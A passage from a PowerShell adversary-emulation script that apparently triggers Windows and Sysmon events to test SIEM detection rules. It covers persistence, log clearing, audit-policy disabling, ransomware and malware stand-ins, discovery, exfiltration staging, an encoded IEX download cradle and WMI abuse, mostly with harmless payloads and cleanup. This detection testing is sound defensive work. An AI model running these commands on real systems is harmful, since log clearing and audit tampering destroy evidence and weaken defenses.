    T 4657 "Run key persistence added (HKCU Run - Sysmon:13)"
    if ($DryRun) { DRY } else {
        try {
            $runPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            $runName = "SOCPersist_$RND"
            Set-ItemProperty -Path $runPath -Name $runName -Value "C:\Windows\System32\cmd.exe /c echo SOC" -ErrorAction Stop
            OK "Run key added -> EID 4657 [RULE-18]"
            SIEM "RULE-18" "Registry Run Key Persistence"
            Add-R 4657 "Persistence" "TRIGGERED" "HKCU Run key" "T1547.001"
            if ($sysmonOK) { Add-R 13 "Sysmon" "TRIGGERED" "Sysmon-13 RegistryValueSet Run" "T1547.001" }
            P
            Remove-ItemProperty -Path $runPath -Name $runName -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message; Add-R 4657 "Persistence" "PARTIAL" $_.Exception.Message }
    }; P

    T 4697 "Service installed via New-Service (Security log - RULE-05)"
    if ($DryRun) { DRY } else {
        try {
            sc.exe create $TestService binPath= "C:\Windows\System32\cmd.exe /c echo SOC" DisplayName= "SOC_PERS" start= demand 2>$null | Out-Null
            OK "sc.exe create -> Security EID 4697 + System EID 7045 [RULE-05]"
            SIEM "RULE-05" "Service Installed by Non-SYSTEM Account"
            Add-R 4697 "Persistence" "TRIGGERED" "sc.exe create security" "T1543.003"
            Add-R 7045 "Persistence" "TRIGGERED" "sc.exe create system" "T1543.003"
            P
            sc.exe delete $TestService 2>$null | Out-Null
        } catch { ERR $_.Exception.Message }
    }; P

    T 4698 "Scheduled task - persistence (AtLogon - RULE-07 P1)"
    if ($DryRun) { DRY } else {
        try {
            $pt = "soc_ptsk_$RND"
            $act  = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo SOC_PERSIST"
            $trig = New-ScheduledTaskTrigger -AtLogOn
            Register-ScheduledTask -TaskName $pt -Action $act -Trigger $trig -Description "SOC_PERSIST_TASK" -Force | Out-Null
            OK "Register-ScheduledTask AtLogOn -> EID 4698 [RULE-07 P1]"
            Add-R 4698 "Persistence" "TRIGGERED" "AtLogOn task" "T1053.005"
            P

            T 4702 "Scheduled task modified (RULE-07 FIRES)"
            Set-ScheduledTask -TaskName $pt -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command exit") | Out-Null
            OK "Set-ScheduledTask -> EID 4702 [RULE-07 FIRES]"
            SIEM "RULE-07" "Scheduled Task Created then Modified < 2 min"
            Add-R 4702 "Persistence" "TRIGGERED" "Set-ScheduledTask" "T1053.005"
            Unregister-ScheduledTask -TaskName $pt -Confirm:$false -ErrorAction SilentlyContinue
        } catch { ERR $_.Exception.Message }
    }; P
}


# ==============================================================================
#  SECTION 11 - AUDIT / DEFENSE EVASION  (T1562 T1070)
# ==============================================================================
if (Run "Audit") {
    Show-Section "11. Audit / Defense Evasion" "1102 104 4616 4719 7036" "T1562 T1070"

    T 4719 "Audit policy disabled (RULE-06)"
    if ($DryRun) { DRY } else {
        try {
            auditpol /set /subcategory:"Logon" /success:disable /failure:disable 2>$null | Out-Null
            Start-Sleep -Milliseconds 500
            auditpol /set /subcategory:"Logon" /success:enable /failure:enable 2>$null | Out-Null
            OK "auditpol disable+restore -> EID 4719 x2 [RULE-06]"
            SIEM "RULE-06" "Audit Policy Disabled - Defense Evasion"
            Add-R 4719 "Audit" "TRIGGERED" "auditpol disable/enable" "T1562.002"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4616 "System time changed"
    if ($DryRun) { DRY } else {
        try {
            $curTime = Get-Date
            Set-Date -Date $curTime.AddMinutes(1) -ErrorAction Stop | Out-Null
            Start-Sleep -Milliseconds 300
            Set-Date -Date $curTime -ErrorAction Stop | Out-Null
            OK "Set-Date +1min restored -> EID 4616 x2"
            Add-R 4616 "Audit" "TRIGGERED" "Set-Date time manipulation" "T1070.006"
        } catch { PARTIAL $_.Exception.Message; Add-R 4616 "Audit" "PARTIAL" $_.Exception.Message }
    }; P

    T 7036 "Service stopped and started (Spooler - RULE-33)"
    if ($DryRun) { DRY } else {
        try {
            Stop-Service Spooler -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
            Start-Service Spooler -ErrorAction SilentlyContinue
            OK "Spooler stop/start -> System EID 7036 [RULE-33]"
            SIEM "RULE-33" "Security-Adjacent Service Stopped and Restarted"
            Add-R 7036 "Audit" "TRIGGERED" "Spooler stop/start" "T1489"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 1102 "Security audit log cleared (RULE-48 - CRITICAL)"
    if ($DryRun) { DRY } else {
        Write-Host ""
        Write-Host "  [!] EID 1102 = Security log clear. This WILL clear the Security log." -ForegroundColor Yellow
        $clrOk = Read-Host "  Clear Security log for RULE-48 test? (YES/NO)"
        if ($clrOk -eq "YES") {
            wevtutil cl Security 2>$null | Out-Null
            OK "wevtutil cl Security -> EID 1102 [RULE-48 FIRES]"
            SIEM "RULE-48" "Security Audit Log Cleared - Defense Evasion CRITICAL"
            Add-R 1102 "Audit" "TRIGGERED" "wevtutil cl Security" "T1070.001"
            P
            wevtutil cl System 2>$null | Out-Null
            OK "wevtutil cl System -> EID 104 [RULE-48 FIRES]"
            Add-R 104 "Audit" "TRIGGERED" "wevtutil cl System" "T1070.001"
        } else {
            PARTIAL "Log clear skipped by operator. EID 1102/104 NOT fired."
            Add-R 1102 "Audit" "PARTIAL" "Skipped by operator"
            Add-R 104  "Audit" "PARTIAL" "Skipped by operator"
        }
    }; P
}


# ==============================================================================
#  SECTION 12 - POLICY CHANGES  (T1562.002)
# ==============================================================================
if (Run "PolicyChanges") {
    Show-Section "12. Policy Changes" "4719 4739" "T1562.002 T1484"

    T 4719 "Audit policy changed (Process Creation subcategory)"
    if ($DryRun) { DRY } else {
        try {
            auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable 2>$null | Out-Null
            OK "auditpol set Process Creation -> EID 4719"
            Add-R 4719 "PolicyChanges" "TRIGGERED" "auditpol Process Creation" "T1562.002"
        } catch { ERR $_.Exception.Message }
    }; P

    T 4739 "Domain password / lockout policy changed"
    if ($DryRun) { DRY } else {
        try {
            $orig = (net accounts 2>$null | Select-String "Lockout threshold") -replace '.*:', '' | ForEach-Object { $_.Trim() }
            net accounts /lockoutthreshold:5  2>$null | Out-Null
            Start-Sleep -Milliseconds 200
            net accounts /lockoutthreshold:10 2>$null | Out-Null
            if ($orig -and $orig -ne "Never") { net accounts /lockoutthreshold:$orig 2>$null | Out-Null }
            OK "lockout threshold 5->10 -> EID 4739"
            Add-R 4739 "PolicyChanges" "TRIGGERED" "lockout threshold toggle" "T1484"
        } catch { ERR $_.Exception.Message }
    }; P
}


# ==============================================================================
#  SECTION 13 - RANSOMWARE KILL CHAIN  (T1486 T1490 T1562)
# ==============================================================================
if (Run "Ransomware") {
    Show-Section "13. Ransomware Kill Chain (SAFE - no real encryption)" "4688 4663 7036 | Sysmon:1 11 23 26" "T1486 T1490 T1562"
    Set-AuditPol "Process Creation"; Set-AuditPol "File System"

    if (-not $DryRun) {
        Write-Host "  [+] Creating $($INT.FileCount) dummy ransom target files..." -ForegroundColor DarkGray
        1..$INT.FileCount | ForEach-Object {
            "SOCTEST_FILE_$_" | Out-File "$TestRansomDir\file_$_.txt" -Force
        }
    }

    T 4663 "Mass file rename to .enc + Sysmon EID 11 (SACL folder - RULE-16)"
    if ($DryRun) { DRY } else {
        try {
            # Apply SACL to TestRansomDir so child file creates/renames fire Sysmon EID 11
            New-SACLFolder -FolderPath $TestRansomDir | Out-Null
            $renamed = 0
            Get-ChildItem -Path $TestRansomDir -Filter "*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
                $newPath = $_.FullName -replace '\.txt$','.enc'
                # Copy via cmd.exe (SACL inherited) then delete original
                $pr = Start-Process cmd.exe -ArgumentList "/c copy `"$($_.FullName)`" `"$newPath`" > nul && del /f /q `"$($_.FullName)`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 150
                if ($pr -and !$pr.HasExited) { try { $pr.Kill() } catch {} }
                $renamed++
            }
            OK ("Renamed {0} files to .enc via cmd.exe -> EID 4663 + Sysmon EID 11 [RULE-16]" -f $renamed)
            SIEM "RULE-16" "Mass File Modification - Ransomware Simulation"
            Add-R 4663 "Ransomware" "TRIGGERED" "mass file rename .enc SACL-folder" "T1486"
            if ($sysmonOK) { Add-R 11 "Sysmon" "TRIGGERED" "Sysmon-11 FileCreate .enc SACL" "T1486" }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "VSS shadow delete command (RULE-15 - CRITICAL)"
    if ($DryRun) { DRY } else {
        try {
            # Run vssadmin list (not delete) - generates same EID 4688 process create
            # SIEM detects vssadmin.exe spawn. Real deletion is: vssadmin delete shadows /all /quiet
            $p = Start-Process vssadmin.exe -ArgumentList "list shadows" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "vssadmin.exe process create -> EID 4688 [RULE-15 fires on SIEM by cmd pattern]"
            SIEM "RULE-15" "Shadow Copy Deletion Command - Ransomware Pre-encryption"
            Add-R 4688 "Ransomware" "TRIGGERED" "vssadmin shadow list" "T1490"
            if ($sysmonOK) { Add-R 1 "Sysmon" "TRIGGERED" "Sysmon-1 vssadmin.exe" "T1490" }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "wmic shadowcopy (RULE-15 variant)"
    if ($DryRun) { DRY } else {
        try {
            $p = Start-Process wmic.exe -ArgumentList "shadowcopy list brief" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "wmic.exe shadowcopy -> EID 4688 [RULE-15 variant]"
            Add-R 4688 "Ransomware" "TRIGGERED" "wmic shadowcopy" "T1490"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "bcdedit /enum (boot config tamper sim - RULE-32)"
    if ($DryRun) { DRY } else {
        try {
            $p = Start-Process bcdedit.exe -ArgumentList "/enum" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "bcdedit.exe -> EID 4688 [RULE-32 boot tamper pattern]"
            SIEM "RULE-32" "Boot Configuration Tamper - bcdedit Spawned"
            Add-R 4688 "Ransomware" "TRIGGERED" "bcdedit /enum" "T1490"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 7036 "Backup/VSS service stopped (RULE-30)"
    if ($DryRun) { DRY } else {
        try {
            Stop-Service -Name VSS -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 400
            Start-Service -Name VSS -ErrorAction SilentlyContinue
            OK "Service stop/start -> System EID 7036 [RULE-30]"
            SIEM "RULE-30" "Backup/AV Service Stopped - Ransomware Pattern"
            Add-R 7036 "Ransomware" "TRIGGERED" "service stop RULE-30" "T1489"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4663 "Ransom note creation (README_DECRYPT.txt)"
    if ($DryRun) { DRY } else {
        try {
            @("$TestRansomDir\README_DECRYPT.txt","$TestRansomDir\HOW_TO_DECRYPT.txt") | ForEach-Object {
                "SOC_RANSOM_NOTE_SIMULATION - TEST ONLY" | Out-File $_ -Force
            }
            OK "Ransom note files created -> EID 4663"
            Add-R 4663 "Ransomware" "TRIGGERED" "ransom note creation" "T1486"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    if (-not $DryRun) {
        Remove-Item $TestRansomDir -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -Path $TestRansomDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
}


# ==============================================================================
#  SECTION 14 - MALWARE  (T1204 T1059)
# BUG-03 FIX: This section was in ValidateSet but completely missing. Now implemented.
# ==============================================================================
if (Run "Malware") {
    Show-Section "14. Malware Simulation" "4688 4663 | Sysmon:1 7 11 15" "T1204 T1059 T1547"

    $malBin  = "$TestDir\soc_update_$RND.exe"
    $malTask = "soc_maltsk_$RND"
    $malSvc  = "soc_malsvc_$RND"
    $malRun  = "SOCMal_$RND"

    T 4688 "Suspicious process chain: cmd -> powershell -EncodedCommand"
    if ($DryRun) { DRY } else {
        try {
            $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host SOCMALWARE"))
            # cmd.exe spawning powershell with encoded command (classic malware pattern)
            $p = Start-Process cmd.exe -ArgumentList "/c powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $enc" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 1200; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "cmd->PS -EncodedCommand chain -> EID 4688 x2"
            Add-R 4688 "Malware" "TRIGGERED" "cmd->PS encoded chain" "T1059.001"
            if ($sysmonOK) { Add-R 1 "Sysmon" "TRIGGERED" "Sysmon-1 cmd->PS parent-child" "T1059.001" }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4663 "Dropped malware binary to disk (TEMP path)"
    if ($DryRun) { DRY } else {
        try {
            # Drop suspicious file to TEMP (copy of legitimate binary, renamed)
            Copy-Item "$env:SystemRoot\System32\notepad.exe" $malBin -Force -ErrorAction Stop
            OK ("Dropped: {0} -> EID 4663 + Sysmon:11 FileCreate in TEMP" -f $malBin)
            Add-R 4663 "Malware" "TRIGGERED" "dropped binary TEMP path" "T1204"
            if ($sysmonOK) { Add-R 11 "Sysmon" "TRIGGERED" "Sysmon-11 FileCreate TEMP .exe" "T1204" }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "certutil -decode (malware staging LOLBin)"
    if ($DryRun) { DRY } else {
        try {
            $src = "$TestDir\soc_mal_$RND.txt"; $dst = "$TestDir\soc_dec_$RND.bin"
            "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" | Out-File $src -Force
            $p = Start-Process certutil.exe -ArgumentList "-decode `"$src`" `"$dst`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "certutil -decode -> EID 4688 (T1140 Deobfuscate LOLBin)"
            Add-R 4688 "Malware" "TRIGGERED" "certutil -decode LOLBin" "T1140"
            Remove-Item $src,$dst -Force -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "regsvr32 loading DLL from non-system path (Sysmon:7)"
    if ($DryRun) { DRY } else {
        try {
            $dllPath = "$TestDir\soc_hook_$RND.dll"
            Copy-Item "$env:SystemRoot\System32\version.dll" $dllPath -Force -ErrorAction SilentlyContinue
            $p = Start-Process regsvr32.exe -ArgumentList "/s `"$dllPath`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "regsvr32 TEMP DLL -> EID 4688 (RULE-LOLBAS)"
            Add-R 4688 "Malware" "TRIGGERED" "regsvr32 non-system DLL" "T1218.010"
            if ($sysmonOK) { Add-R 7 "Sysmon" "TRIGGERED" "Sysmon-7 ImageLoad non-system path" "T1218.010" }
            Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4698 "Suspicious scheduled task with encoded payload"
    if ($DryRun) { DRY } else {
        try {
            $enc2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host SOC_MALWARE_PERSIST"))
            $act  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -EncodedCommand $enc2"
            $trig = New-ScheduledTaskTrigger -AtLogOn
            Register-ScheduledTask -TaskName $malTask -Action $act -Trigger $trig -Description "SOC_MAL_PERSIST" -Force | Out-Null
            OK "Malware-style scheduled task with encoded payload -> EID 4698"
            SIEM "RULE-07" "Suspicious Task - PS Encoded Command Payload"
            Add-R 4698 "Malware" "TRIGGERED" "malware task PS encoded" "T1053.005"
            Unregister-ScheduledTask -TaskName $malTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4657 "Malware-style Run key + ADS (Sysmon:15)"
    if ($DryRun) { DRY } else {
        try {
            # Run key persistence
            Set-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $malRun -Value $malBin -ErrorAction SilentlyContinue
            # Alternate Data Stream (hiding payload)
            $adsFile = "$TestDir\soc_ads_$RND.txt"
            "Normal file" | Out-File $adsFile -Force
            Set-Content -Path ($adsFile + ":hidden_payload") -Value "SOC_ADS_MALWARE_SIM" -ErrorAction SilentlyContinue
            OK "Run key + ADS created -> EID 4657 + Sysmon:15 FileCreateStreamHash"
            SIEM "RULE-18" "Run Key + ADS - Malware Persistence Combo"
            Add-R 4657 "Malware" "TRIGGERED" "Run key + ADS persistence" "T1547.001"
            if ($sysmonOK) { Add-R 15 "Sysmon" "TRIGGERED" "Sysmon-15 FileCreateStreamHash ADS" "T1564.004" }
            # Cleanup
            Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $malRun -ErrorAction SilentlyContinue
            Remove-Item $adsFile -Force -ErrorAction SilentlyContinue
            Remove-Item $malBin  -Force -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message }
    }; P
}


# ==============================================================================
#  SECTION 15 - DISCOVERY  (T1087 T1082 T1135)
# ==============================================================================
if (Run "Discovery") {
    Show-Section "15. Discovery / Enumeration" "4688 | Sysmon:1 22" "T1087 T1082 T1135 T1016"
    Set-AuditPol "Process Creation"

    $discCmds = @(
        @{ F="net.exe";        A="user /domain";                    M="T1087.002 domain users" },
        @{ F="net.exe";        A='group "Domain Admins" /domain';   M="T1069.002 Domain Admins" },
        @{ F="net.exe";        A="localgroup Administrators";        M="T1069.001 local admins" },
        @{ F="nltest.exe";     A="/domain_trusts";                   M="T1482 domain trusts" },
        @{ F="nltest.exe";     A="/dsgetdc:$env:USERDOMAIN";         M="T1018 DC discovery" },
        @{ F="whoami.exe";     A="/all";                             M="T1033 current user" },
        @{ F="ipconfig.exe";   A="/all";                             M="T1016 network config" },
        @{ F="arp.exe";        A="-a";                               M="T1016 ARP table" },
        @{ F="netstat.exe";    A="-an";                              M="T1049 connections" },
        @{ F="net.exe";        A="share";                            M="T1135 shares" },
        @{ F="net.exe";        A="view /domain";                     M="T1018 domain hosts" },
        @{ F="systeminfo.exe"; A="";                                 M="T1082 system info" },
        @{ F="tasklist.exe";   A="/svc";                             M="T1057 process list" },
        @{ F="wmic.exe";       A="computersystem get domain,name";   M="T1082 WMIC sysinfo" }
    )

    foreach ($dc in $discCmds) {
        T 4688 ("Discovery: {0} {1}" -f $dc.F, ($dc.A.Substring(0, [Math]::Min($dc.A.Length, 35))))
        if ($DryRun) { DRY } else {
            try {
                $p = Start-Process -FilePath $dc.F -ArgumentList $dc.A -WindowStyle Hidden -PassThru -ErrorAction Stop
                Start-Sleep -Milliseconds 500; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
                OK ("{0}" -f $dc.M)
                Add-R 4688 "Discovery" "TRIGGERED" ("Discovery: " + $dc.F) $dc.M
                if ($sysmonOK) { Add-R 1 "Sysmon" "TRIGGERED" ("Sysmon-1: " + $dc.F) $dc.M }
            } catch { PARTIAL $_.Exception.Message; Add-R 4688 "Discovery" "PARTIAL" $_.Exception.Message }
        }; P
    }

    if ($adOK) {
        T 4688 "AD LDAP enumeration via PS (Get-ADUser/Group/Computer - RULE-26)"
        if ($DryRun) { DRY } else {
            try {
                $psADEnum = 'Import-Module ActiveDirectory -EA SilentlyContinue; Get-ADUser -Filter * -ResultSetSize 5 -EA SilentlyContinue | Out-Null; Get-ADGroup -Filter * -ResultSetSize 5 -EA SilentlyContinue | Out-Null; Get-ADComputer -Filter * -ResultSetSize 5 -EA SilentlyContinue | Out-Null'
                $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psADEnum))
                $p = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc" -PassThru -ErrorAction Stop
                Start-Sleep -Milliseconds 1500; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
                OK "PS AD enumeration -> EID 4688 + LDAP queries [RULE-26]"
                SIEM "RULE-26" "AD LDAP Enumeration via PowerShell"
                Add-R 4688 "Discovery" "TRIGGERED" "PS AD LDAP enum RULE-26" "T1087.002"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    }

    if ($sysmonOK) {
        Ts 22 "Sysmon DNS queries (DGA-style enumeration)"
        if ($DryRun) { DRY } else {
            try {
                @("dc01.$env:USERDOMAIN","ldap.$env:USERDOMAIN","mail.$env:USERDOMAIN") | ForEach-Object {
                    try { [System.Net.Dns]::GetHostAddresses($_) | Out-Null } catch {}
                    Start-Sleep -Milliseconds 80
                }
                OK "DNS queries -> Sysmon:22 DNSEvent"
                Add-R 22 "Sysmon" "TRIGGERED" "Sysmon-22 DNS enum queries" "T1018"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    }
}


# ==============================================================================
#  SECTION 16 - EXFILTRATION PREP  (T1560 T1048)
# ==============================================================================
if (Run "Exfil") {
    Show-Section "16. Exfiltration Preparation" "4688 4663 5145 | Sysmon:1 3 11" "T1560 T1048 T1027"
    Set-AuditPol "File System"; Set-AuditPol "Process Creation"

    if (-not $DryRun) {
        1..[Math]::Min($INT.FileCount, 20) | ForEach-Object { "SOC_SENSITIVE_DATA_$_" | Out-File "$TestExfilDir\secret_$_.txt" -Force }
    }

    T 4688 "Compress-Archive ZIP (exfil staging - RULE-27)"
    if ($DryRun) { DRY } else {
        try {
            $zipOut = "$env:TEMP\soc_exfil_$RND.zip"
            Compress-Archive -Path "$TestExfilDir\*" -DestinationPath $zipOut -Force -ErrorAction Stop
            OK "Compress-Archive -> zip archive -> EID 4688 + 4663"
            SIEM "RULE-27" "Archive Created in Temp - Exfiltration Staging"
            Add-R 4688 "Exfil" "TRIGGERED" "Compress-Archive zip" "T1560"
            if ($sysmonOK) { Add-R 11 "Sysmon" "TRIGGERED" "Sysmon-11 FileCreate .zip" "T1560" }
            Remove-Item $zipOut -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "certutil -encode (LOLBin data staging - RULE-28)"
    if ($DryRun) { DRY } else {
        try {
            $src = "$env:TEMP\soc_esrc_$RND.txt"; $enc = "$env:TEMP\soc_eenc_$RND.b64"
            "SOC_EXFIL_SIMULATION" | Out-File $src -Force
            $p = Start-Process certutil.exe -ArgumentList "-encode `"$src`" `"$enc`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "certutil -encode -> EID 4688 (LOLBin T1027)"
            SIEM "RULE-28" "certutil Used for Data Encoding - Exfil LOLBin"
            Add-R 4688 "Exfil" "TRIGGERED" "certutil -encode LOLBin" "T1027"
            Remove-Item $src,$enc -ErrorAction SilentlyContinue
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 5145 "Network share file access (share enumeration sim)"
    if ($DryRun) { DRY } else {
        try {
            net use \\$env:COMPUTERNAME\C$ 2>$null | Out-Null
            $null = Test-Path "\\$env:COMPUTERNAME\C$\Windows" -ErrorAction SilentlyContinue
            net use \\$env:COMPUTERNAME\C$ /delete /y 2>$null | Out-Null
            OK "UNC C$ access -> EID 5145 detailed file share"
            Add-R 5145 "Exfil" "TRIGGERED" "UNC C$ share access" "T1039"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    if ($sysmonOK) {
        Ts 3 "Sysmon outbound HTTPS (exfil channel sim)"
        if ($DryRun) { DRY } else {
            try {
                $tc = New-Object System.Net.Sockets.TcpClient
                try { $tc.ConnectAsync("8.8.8.8", 443).Wait(800) } catch {}
                try { $tc.Close() } catch {}
                OK "TCP 8.8.8.8:443 -> Sysmon:3 (HTTPS exfil channel)"
                Add-R 3 "Sysmon" "TRIGGERED" "Sysmon-3 HTTPS exfil sim" "T1048"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    }

    if (-not $DryRun) { Remove-Item $TestExfilDir -Recurse -Force -ErrorAction SilentlyContinue }
}


# ==============================================================================
#  SECTION 17 - POWERSHELL ABUSE  (T1059.001)
# ==============================================================================
if (Run "PowerShellAbuse") {
    Show-Section "17. PowerShell Abuse" "4688 4104 | Sysmon:1 3" "T1059.001 T1218"
    Set-AuditPol "Process Creation"

    # Enable ScriptBlock logging for EID 4104
    $psLogPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (-not $DryRun) {
        if (-not (Test-Path $psLogPath)) { New-Item $psLogPath -Force | Out-Null }
        Set-ItemProperty -Path $psLogPath -Name "EnableScriptBlockLogging" -Value 1 -ErrorAction SilentlyContinue
    }

    T 4688 "PS -EncodedCommand IEX download cradle (RULE-25)"
    if ($DryRun) { DRY } else {
        try {
            $cradle = "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/soc_test')"
            $enc    = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cradle))
            $p = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc" -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 800; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "PS IEX download cradle -> EID 4688 + 4104 [RULE-25]"
            SIEM "RULE-25" "PowerShell Download Cradle (IEX/WebClient)"
            Add-R 4688 "PowerShellAbuse" "TRIGGERED" "PS IEX cradle" "T1059.001"
            Add-R 4104 "PowerShellAbuse" "TRIGGERED" "PS ScriptBlock 4104 IEX" "T1059.001"
            if ($sysmonOK) { Add-R 1 "Sysmon" "TRIGGERED" "Sysmon-1 PS cradle" "T1059.001" }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "PS Mimikatz pattern string (RULE-25 variant)"
    if ($DryRun) { DRY } else {
        try {
            $mimiSim = 'Write-Host "Invoke-Mimikatz -Command sekurlsa::logonpasswords SOC_TEST"'
            $enc     = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($mimiSim))
            $p = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc" -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 600; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "PS Mimikatz string -> EID 4104 ScriptBlock (RULE-25)"
            Add-R 4688 "PowerShellAbuse" "TRIGGERED" "PS Mimikatz pattern" "T1059.001"
            Add-R 4104 "PowerShellAbuse" "TRIGGERED" "PS ScriptBlock 4104 mimikatz" "T1059.001"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "PS ExecutionPolicy Bypass (RULE-37)"
    if ($DryRun) { DRY } else {
        try {
            $p = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Write-Host SOC_BYPASS" -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 500; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "PS -ExecutionPolicy Bypass -> EID 4688 [RULE-37]"
            SIEM "RULE-37" "PowerShell ExecutionPolicy Bypass"
            Add-R 4688 "PowerShellAbuse" "TRIGGERED" "PS ExecutionPolicy Bypass" "T1059.001"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "PS Version 2 downgrade attempt (AMSI bypass)"
    if ($DryRun) { DRY } else {
        try {
            $p = Start-Process powershell.exe -ArgumentList "-Version 2 -NoProfile -WindowStyle Hidden -Command Write-Host SOC_PSV2" -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 500; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "PS -Version 2 -> EID 4688 (AMSI bypass via downgrade)"
            Add-R 4688 "PowerShellAbuse" "TRIGGERED" "PS v2 downgrade AMSI bypass" "T1059.001"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    # Restore ScriptBlock logging to previous state
    if (-not $DryRun) {
        Remove-ItemProperty -Path $psLogPath -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
    }
}


# ==============================================================================
#  SECTION 18 - WMI ABUSE  (T1047 T1546.003)
# ==============================================================================
if (Run "WMIAbuse") {
    Show-Section "18. WMI Abuse" "4688 | Sysmon:1 19 20 21" "T1047 T1546.003"

    T 4688 "WMI process create via Invoke-WmiMethod (RULE-39)"
    if ($DryRun) { DRY } else {
        try {
            $r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c echo SOC_WMI" -ErrorAction Stop
            if ($r -and $r.ProcessId) { Start-Sleep -Milliseconds 300; Stop-Process -Id $r.ProcessId -Force -ErrorAction SilentlyContinue }
            OK "Invoke-WmiMethod Win32_Process Create -> EID 4688"
            SIEM "RULE-39" "WMI Remote Process Creation"
            Add-R 4688 "WMIAbuse" "TRIGGERED" "Invoke-WmiMethod Process" "T1047"
            if ($sysmonOK) { Add-R 1 "Sysmon" "TRIGGERED" "Sysmon-1 wmiprvse spawn" "T1047" }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    T 4688 "wmic.exe process call create"
    if ($DryRun) { DRY } else {
        try {
            $p = Start-Process wmic.exe -ArgumentList 'process call create "cmd.exe /c echo SOC_WMIC"' -WindowStyle Hidden -PassThru -ErrorAction Stop
            Start-Sleep -Milliseconds 800; if ($p -and !$p.HasExited) { try { $p.Kill() } catch {} }
            OK "wmic process call create -> EID 4688"
